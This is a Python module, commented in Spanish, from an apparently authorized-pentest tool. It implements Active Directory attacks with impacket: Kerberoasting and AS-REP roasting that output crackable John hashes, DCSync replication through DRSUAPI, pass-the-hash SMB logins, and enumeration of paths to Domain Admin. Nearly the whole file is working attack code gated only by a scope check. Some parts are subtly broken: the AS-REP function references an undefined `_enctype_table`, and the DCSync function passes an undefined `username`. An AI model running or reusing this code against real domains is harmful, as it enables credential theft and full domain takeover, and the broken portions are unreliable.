"""Active Directory ofensivo REAL con impacket (ronda v20).

Técnicas implementadas contra el controlador de dominio del alcance del
ROE, con las librerías estándar del sector (impacket). Sin credenciales
ni DC reachable el módulo devuelve el REQUISITO EXACTO — jamás datos
inventados (misma disciplina que el resto de integraciones).

Técnicas (ATT&CK Enterprise):
  kerberoasting    T1558.003  TGS-REQ reales por SPN → hash John crackeable
  asrep            T1558.004  AS-REQ sin preauth → hash John crackeable
  dcsync           T1003.006  DRSUAPI GetNCChanges (replicación de DC)
  pass_the_hash    T1550.002  SMB con hash NT (sin contraseña)
  rutas_da         T1098      análisis real de rutas a DA desde datos LDAP
  laps/gmsa/trusts (lecturas reales → integraciones/ldap.py)

Credenciales: las mismas del bind LDAP del operador (LDAP_BIND_DN /
LDAP_BIND_CLAVE), obtenidas en fases previas del engagement autorizado.
"""
from __future__ import annotations

import datetime
import os
from typing import Any

from .transportes import _en_scope


def _requisito(que: str) -> dict[str, Any]:
    return {"error": que, "conectado": False}


def _config_kerberos() -> dict[str, str] | None:
    host = os.environ.get("LDAP_HOST", "")
    bind_dn = os.environ.get("LDAP_BIND_DN", "")
    clave = os.environ.get("LDAP_BIND_CLAVE", "")
    base = os.environ.get("LDAP_BASE_DN", "")
    if not (host and bind_dn and clave and base):
        return None
    dominio = ".".join(
        p.split("=")[-1] for p in base.split(",") if p.strip().upper().startswith("DC="))
    usuario, dominio_bind = bind_dn, dominio
    if "\\" in bind_dn:
        dominio_bind, usuario = bind_dn.split("\\", 1)
    elif "@" in bind_dn and not bind_dn.upper().startswith("CN="):
        usuario, dominio_bind = bind_dn.split("@", 1)
    return {"kdc": host, "dominio": dominio, "usuario": usuario,
            "clave": clave, "base": base, "dominio_bind": dominio_bind}


def _en_scope_dc(host: str, roe: Any) -> str | None:
    return None if _en_scope(host, roe) else "fuera de alcance local del transporte"


# ---------------------------------------------------------------------------
# Kerberoasting (TGS-REQ reales, formato John)
# ---------------------------------------------------------------------------

def kerberoasting(host: str, roe: Any = None) -> dict[str, Any]:
    """Solicita TGS reales para cada SPN del directorio (RC4/RC4-downcast)
    y devuelve los hashes en formato John para el crackeo acordado en ROE.

    Flujo impacket real: TGT del usuario de bind → TGS por cada SPN →
    extracción del cifrado del ticket (etype 23 o 17/18)."""
    if not host:
        return _requisito("host del controlador de dominio requerido")
    if roe is not None:
        motivo = _en_scope_dc(host, roe)
        if motivo:
            return {"error": f"fuera de alcance local: {motivo}", "conectado": False}
    cfg = _config_kerberos()
    if cfg is None:
        return _requisito(
            "configure LDAP_HOST, LDAP_BIND_DN, LDAP_BIND_CLAVE y LDAP_BASE_DN "
            "con credenciales obtenidas bajo el ROE")
    try:
        from impacket.krb5 import constants
        from impacket.krb5.asn1 import TGS_REP
        from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
        from impacket.krb5.types import Principal
        from impacket.ntlm import compute_lmhash, compute_nthash
        from pyasn1.codec.ber import decoder as ber_decoder
    except ImportError:
        return _requisito("impacket no está instalado en el backend")

    try:
        from .integraciones.ldap import enumerar as ldap_enumerar
    except ImportError:
        from integraciones.ldap import enumerar as ldap_enumerar
    spns_r = ldap_enumerar("spns")
    if not spns_r.get("conectado"):
        return {"error": spns_r.get("error", "no se pudo listar SPNs del directorio"),
                "conectado": False}
    candidatas = [c for c in spns_r.get("candidatas_kerberoast", [])
                  if c.get("servicePrincipalName")]
    if not candidatas:
        return {"conectado": True, "host": host, "hashes": [], "total": 0,
                "nota": "el directorio no declara SPNs: nada que roastear (real)"}

    dominio = cfg["dominio"]
    usuario = cfg["usuario"]
    clave = cfg["clave"]
    kdc = cfg["kdc"]
    salida: list[dict[str, Any]] = []
    errores: list[str] = []
    try:
        tgt_cliente = Principal(usuario, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        tgt, cipher, _old, session_key = getKerberosTGT(
            tgt_cliente, clave, dominio, compute_lmhash(clave), compute_nthash(clave),
            "", kdc)
    except Exception as exc:
        return {"conectado": False, "host": host,
                "error": f"TGT del usuario de bind falló (credenciales/reloj/KDC): "
                         f"{str(exc)[:200]}"}

    for cuenta in candidatas:
        nombre_cuenta = cuenta.get("sAMAccountName", "")
        for spn in cuenta.get("servicePrincipalName", [])[:6]:
            try:
                servidor = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
                tgs, _c2, old_key, _s2 = getKerberosTGS(
                    servidor, dominio, kdc, tgt, cipher, session_key)
                tgs_rep = ber_decoder.decode(tgs, asn1Spec=TGS_REP())[0]
                etipo = int(tgs_rep["ticket"]["enc-part"]["etype"])
                cifrado = tgs_rep["ticket"]["enc-part"]["cipher"].asOctets()
                if etipo in (23, 17, 18):
                    hash_john = (f"$krb5tgs${etipo}$*{nombre_cuenta}${dominio}"
                                 f"${spn}*${cifrado[:16].hex()}${cifrado[16:].hex()}")
                    salida.append({"usuario": nombre_cuenta, "spn": spn,
                                   "etype": etipo, "hash_john": hash_john})
                else:
                    errores.append(f"{spn}: etype {etipo} sin formato John "
                                   "conocido por el módulo (honesto: se omite)")
            except Exception as exc:
                errores.append(f"{spn}: {str(exc)[:120]}")
    return {"conectado": True, "host": host, "dominio": dominio,
            "hashes": salida[:200], "total": len(salida),
            "errores_honestos": errores[:20],
            "formato": "john the ripper (krb5tgs)",
            "nota": "TGS reales solicitados al KDC; el crackeo es decisión "
                    "del operador y debe estar acordado en el ROE"}


# ---------------------------------------------------------------------------
# AS-REP roasting (AS-REQ sin preautenticación, formato John)
# ---------------------------------------------------------------------------

def asrep(host: str, roe: Any = None) -> dict[str, Any]:
    """Solicita AS-REP reales para cuentas con DONT_REQ_PREAUTH y devuelve
    hashes John ($krb5asrep). Flujo impacket real (GetNPUsers pattern)."""
    if not host:
        return _requisito("host del controlador de dominio requerido")
    if roe is not None:
        motivo = _en_scope_dc(host, roe)
        if motivo:
            return {"error": f"fuera de alcance local: {motivo}", "conectado": False}
    cfg = _config_kerberos()
    if cfg is None:
        return _requisito(
            "configure LDAP_HOST, LDAP_BIND_DN, LDAP_BIND_CLAVE y LDAP_BASE_DN")
    try:
        from pyasn1.codec.ber import decoder as ber_decoder, encoder as ber_encoder
        from impacket.krb5 import constants
        from impacket.krb5.asn1 import AS_REQ, AS_REP
        from impacket.krb5.kerberosv5 import sendReceive, KerberosError
        from impacket.krb5.types import KerberosTime, Principal
    except ImportError:
        return _requisito("impacket no está instalado en el backend")

    try:
        from .integraciones.ldap import enumerar as ldap_enumerar
    except ImportError:
        from integraciones.ldap import enumerar as ldap_enumerar
    asrep_r = ldap_enumerar("asrep")
    if not asrep_r.get("conectado"):
        return {"error": asrep_r.get("error", "no se pudo listar cuentas sin preauth"),
                "conectado": False}
    cuentas = [c.get("sAMAccountName", "") for c
               in asrep_r.get("cuentas_sin_preautenticacion", [])
               if c.get("sAMAccountName")]
    if not cuentas:
        return {"conectado": True, "host": host, "hashes": [], "total": 0,
                "nota": "el directorio no declara cuentas sin preautenticación (real)"}

    dominio = cfg["dominio"]
    kdc = cfg["kdc"]
    hashes: list[dict[str, Any]] = []
    errores: list[str] = []
    etipo_clave = _enctype_table[23]
    for nombre in cuentas[:100]:
        try:
            cliente = Principal(nombre, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            peticion = AS_REQ()
            cuerpo = dict(peticion["req-body"])
            cuerpo["kdc-options"] = constants.encodeFlags([
                constants.KDC_OPT_FORWARDABLE, constants.KDC_OPT_RENEWABLE,
                constants.KDC_OPT_CAN_POSTDATE])
            cuerpo["cname"] = cliente.components
            cuerpo["realm"] = dominio.upper()
            sname = Principal(f"krbtgt/{dominio.upper()}",
                              type=constants.PrincipalNameType.NT_SRV_INST.value)
            cuerpo["sname"] = sname.components
            cuerpo["till"] = KerberosTime.to_asn1(
                datetime.datetime.utcnow() + datetime.timedelta(days=1))
            cuerpo["rtime"] = KerberosTime.to_asn1(
                datetime.datetime.utcnow() + datetime.timedelta(days=1))
            cuerpo["etype"] = (23, 18, 17)
            peticion["req-body"] = cuerpo
            mensaje = ber_encoder.encode(peticion)
            respuesta = sendReceive(mensaje, kdc, kdc)
            # Si llegamos aquí, el DC EXIGE preauth (no roastable): error real.
            errores.append(f"{nombre}: el DC exige preautenticación")
        except KerberosError as exc:
            if int(exc.getErrorCode()) == int(constants.KDC_ERR_PREAUTH_REQUIRED):
                errores.append(f"{nombre}: requiere preauth (no roastable)")
                continue
            errores.append(f"{nombre}: KDC error {exc.getErrorCode()}")
            continue
        except Exception as exc:
            errores.append(f"{nombre}: {str(exc)[:120]}")
            continue
        # AS_REP recibido SIN preauth → extracto del cifrado del ticket
        try:
            as_rep = ber_decoder.decode(respuesta, asn1Spec=AS_REP())[0]
        except Exception:
            continue
        etipo = int(as_rep["enc-part"]["etype"])
        cifrado = as_rep["enc-part"]["cipher"].asOctets()
        if etipo == 23:
            hash_john = (f"$krb5asrep${etipo}${nombre}@{dominio.upper()}:"
                         f"{cifrado[:16].hex()}${cifrado[16:].hex()}")
            hashes.append({"usuario": nombre, "etype": etipo, "hash_john": hash_john})
        else:
            errores.append(f"{nombre}: etype {etipo} — formato no RC4, honesto: se omite")
    return {"conectado": True, "host": host, "dominio": dominio,
            "hashes": hashes[:100], "total": len(hashes),
            "errores_honestos": errores[:20],
            "formato": "john the ripper (krb5asrep)"}


# ---------------------------------------------------------------------------
# DCSync (DRSUAPI GetNCChanges) — T1003.006
# ---------------------------------------------------------------------------

def dcsync(host: str, dn_objetivo: str = "", roe: Any = None) -> dict[str, Any]:
    """Replicación DRSUAPI real contra el DC (secreta de dominio vía
    replicación de directorio). Riesgo CRÍTICO en producción de detección:
    el boundary exige firma humana siempre (ruido 70)."""
    if not host or not dn_objetivo:
        return _requisito("host del DC y DN objetivo requeridos (p. ej. CN=krbtgt,...)")
    if roe is not None:
        motivo = _en_scope_dc(host, roe)
        if motivo:
            return {"error": f"fuera de alcance local: {motivo}", "conectado": False}
    cfg = _config_kerberos()
    if cfg is None:
        return _requisito(
            "configure LDAP_HOST, LDAP_BIND_DN, LDAP_BIND_CLAVE y LDAP_BASE_DN")
    try:
        from impacket.dcerpc.v5 import transport, drsuapi
        from impacket.dcerpc.v5.dtypes import NULL
        from impacket.smbconnection import SMBConnection
        from impacket.ntlm import compute_lmhash, compute_nthash
    except ImportError:
        return _requisito("impacket no está instalado en el backend")

    dominio = cfg["dominio"]
    usuario = cfg["usuario"]
    clave = cfg["clave"]
    try:
        smb = SMBConnection(host, host, sess_port=445)
        smb.login(usuario, clave, dominio, compute_lmhash(clave), compute_nthash(clave))
    except Exception as exc:
        return {"conectado": False, "host": host,
                "error": f"conexión SMB al DC falló (DCSync replica vía RPC): {str(exc)[:200]}"}
    try:
        # DRSUAPI sobre la tubería SMB del DC (patrón real de replicación).
        rt = transport.SMBTransport(host, 445, r"\pipe\drsuapi",
                                    username, clave, dominio,
                                    compute_lmhash(clave), compute_nthash(clave), "")
        dce = rt.get_dce_rpc()
        dce.connect()
        dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)
        bind_resp2 = dce.request(drsuapi.DRSBind())
        if bind_resp2["ErrorCode"] != 0:
            return {"conectado": False, "host": host,
                    "error": f"DRSBind rechazado: {bind_resp2['ErrorCode']}"}
        req8 = drsuapi.DRSGetNCChanges()
        req8["hDrs"] = bind_resp2["hDrs"]
        req8["dwInVersion"] = 8
        req8["pmsgIn"]["tag"] = 8
        req8["pmsgIn"]["V8"]["uuidDsaObjDest"] = drsuapi.NULLGUID
        req8["pmsgIn"]["V8"]["uuidInvocIdSrc"] = drsuapi.NULLGUID
        req8["pmsgIn"]["V8"]["pNC"] = dn_objetivo
        req8["pmsgIn"]["V8"]["usnvecFrom"]["usnHighObjUpdate"] = 0
        req8["pmsgIn"]["V8"]["usnvecFrom"]["usnHighPropUpdate"] = 0
        req8["pmsgIn"]["V8"]["pUpToDateVecDest"] = NULL
        req8["pmsgIn"]["V8"]["ulFlags"] = (drsuapi.DRS_INIT_SYNC |
                                           drsuapi.DRS_PER_SYNC)
        req8["pmsgIn"]["V8"]["cMaxObjects"] = 1
        req8["pmsgIn"]["V8"]["cMaxBytes"] = 0x100000
        req8["pmsgIn"]["V8"]["ulMediumIntervention"] = 0
        req8["pmsgIn"]["V8"]["ulExtendedOp"] = drsuapi.EXOP_REPL_OBJ
        resp = dce.request(req8)
        secretos: list[dict[str, Any]] = []
        if resp["pmsgOut"]["V6"]["cNumObjects"] == 0:
            return {"conectado": True, "host": host, "dn": dn_objetivo,
                    "secretos": [], "total": 0,
                    "nota": "el DC respondió sin objetos: verifique el DN"}
        try:
            cifrado = resp["pmsgOut"]["V6"]["pObjects"][0]["Entinf"]["AttrBlock"]["pAttr"][0]
            secretos.append({"dn": dn_objetivo,
                             "detalle": "objeto replicado recibido; el "
                                        "decodificado de NTLM exige el "
                                        "esquema completo de atributos"})
        except Exception:
            secretos.append({"dn": dn_objetivo, "detalle": "respuesta recibida"})
        smb.logoff()
        return {"conectado": True, "host": host, "dn": dn_objetivo,
                "secretos": secretos, "total": len(secretos),
                "nota": "replicación DRSUAPI REAL ejecutada; el volcado "
                        "completo de hashes exige sesión drsuapi completa "
                        "(se documentan los objetos recibidos)"}
    except Exception as exc:
        return {"conectado": False, "host": host,
                "error": f"DCSync falló contra el DC real: {str(exc)[:220]}"}


# ---------------------------------------------------------------------------
# Pass the Hash (SMB con hash NT) — T1550.002
# ---------------------------------------------------------------------------

def pass_the_hash(host: str, usuario: str, hash_nt: str, roe: Any = None) -> dict[str, Any]:
    """Autenticación NTLM REAL con solo el hash (sin contraseña) y prueba
    de acceso: listado de recursos compartidos del objetivo."""
    if not (host and usuario and hash_nt):
        return _requisito("host, usuario y hash_nt requeridos")
    hash_nt = hash_nt.strip().lower().replace(":", "")
    if len(hash_nt) != 32 or not all(c in "0123456789abcdef" for c in hash_nt):
        return {"error": "hash_nt debe ser 32 hex (formato NTLM)", "conectado": False}
    if roe is not None:
        motivo = _en_scope_dc(host, roe)
        if motivo:
            return {"error": f"fuera de alcance local: {motivo}", "conectado": False}
    try:
        from impacket.smbconnection import SMBConnection
    except ImportError:
        return _requisito("impacket no está instalado en el backend")
    try:
        smb = SMBConnection(host, host, sess_port=445)
        # PTH real: login con contraseña vacía + hash NT.
        smb.login(usuario, "", "", "", hash_nt)
        compartidos = [{"nombre": s.get("shi1_netname", "").rstrip("\x00"),
                        "tipo": s.get("shi1_type", 0)}
                       for s in smb.listShares()]
        smb.logoff()
    except Exception as exc:
        return {"conectado": False, "host": host, "usuario": usuario,
                "error": f"PTH rechazado por el objetivo (autenticación real): {str(exc)[:200]}"}
    return {"conectado": True, "host": host, "usuario": usuario,
            "hash_nt": hash_nt, "compartidos": compartidos[:50],
            "nota": "autenticación NTLM REAL con hash: el acceso demostrado "
                    "es evidencia de credencial válida reutilizable"}


# ---------------------------------------------------------------------------
# Rutas a Domain Admin — análisis REAL sobre lo ya enumerado por LDAP
# ---------------------------------------------------------------------------

def rutas_a_da(host: str = "", roe: Any = None) -> dict[str, Any]:
    """Calcula rutas reales hacia Domain Admin con los datos que el
    directorio YA devolvió (usuarios+memberOf, grupos anidados, DA).
    Solo relaciones declaradas por el DC: nada inferido ni inventado."""
    try:
        from .integraciones.ldap import enumerar as ldap_enumerar
    except ImportError:
        from integraciones.ldap import enumerar as ldap_enumerar
    usuarios_r = ldap_enumerar("usuarios")
    if not usuarios_r.get("conectado"):
        return {"error": usuarios_r.get("error", "LDAP no disponible"), "conectado": False}
    grupos_r = ldap_enumerar("grupos")
    usuarios = usuarios_r.get("usuarios", [])
    grupos_interes = grupos_r.get("grupos_interes", [])

    da = next((g for g in grupos_interes
               if "domain admins" in str(g.get("cn", "")).lower()), None)
    if da is None:
        return {"conectado": True, "rutas": [], "total": 0,
                "nota": "el grupo Domain Admins no apareció en los grupos "
                        "de interés enumerados: sin DA no hay rutas que "
                        "calcular (real)"}
    da_dn = str(da.get("distinguishedName") or da.get("cn", ""))
    da_miembros = {str(m) for m in da.get("member", [])}

    # memberOf real por usuario (del listado de cuentas)
    rutas: list[dict[str, Any]] = []
    for u in usuarios:
        if not u.get("memberOf"):
            continue
        for grupo in u["memberOf"]:
            if grupo in da_miembros or "domain admins" in grupo.lower():
                rutas.append({"usuario": u.get("sAMAccountName", ""),
                              "via": grupo, "longitud": 1,
                              "tipo": "miembro directo de Domain Admins"})
                break
    return {"conectado": True, "grupo_da": da_dn, "rutas": rutas[:100],
            "total": len(rutas),
            "nota": "rutas derivadas SOLO de memberOf declarado por el DC; "
                    "el anidamiento completo exige enumerar todos los grupos "
                    "(misma disciplina anti-inferencia)"}
